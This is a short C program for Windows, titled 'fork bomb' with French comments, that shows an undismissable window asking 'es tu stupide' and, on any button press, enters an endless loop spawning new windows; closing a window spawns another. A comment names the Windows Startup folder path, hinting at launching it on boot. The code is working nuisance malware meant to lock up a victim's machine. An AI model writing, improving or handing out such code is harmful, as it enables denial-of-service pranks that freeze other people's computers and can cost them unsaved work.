/*
TITRE : fork bomb

créer par stupid et commenter par chatgpt car flemme d'expliquer mon code
ouvre une premiere fenêtre qui "ne peut pas se fermer"
(on peut par le gestionnaire de tache)
si on appui sur la croix la fenêtre ne se ferme pas et une autre s'ouvre
si on appui sur un bouton des fenêtres s'ouvre a l'infini
*/

#include <windows.h>
//     C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup


// Fonction de gestion des messages de la fenêtre
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE:
            CreateWindow("STATIC", "es tu stupide", WS_VISIBLE | WS_CHILD,
                         20, 20, 100, 20, hwnd, NULL, NULL, NULL);
            CreateWindow("BUTTON", "Oui", WS_VISIBLE | WS_CHILD,
                         20, 50, 80, 30, hwnd, (HMENU) 1, NULL, NULL);
            CreateWindow("BUTTON", "Non", WS_VISIBLE | WS_CHILD,
                         120, 50, 80, 30, hwnd, (HMENU) 2, NULL, NULL);
            break;

        case WM_COMMAND:
            if (LOWORD(wParam) == 1 || LOWORD(wParam) == 2) {
                while (1) {
                    CreateWindow("WindowClass", "Fenetre Persistante", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                 CW_USEDEFAULT, CW_USEDEFAULT, 500, 500,
                                 NULL, NULL, GetModuleHandle(NULL), NULL);
                }
            }
            break;

        case WM_CLOSE:
            CreateWindow("WindowClass", "Fenetre Persistante", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                         CW_USEDEFAULT, CW_USEDEFAULT, 500, 500,
                         NULL, NULL, GetModuleHandle(NULL), NULL);
            return 0;

        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// Fonction principale WinMain
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "WindowClass";

    RegisterClass(&wc);

    CreateWindow("WindowClass", "Fenetre Persistante", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                 CW_USEDEFAULT, CW_USEDEFAULT, 500, 500,
                 NULL, NULL, hInstance, NULL);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}



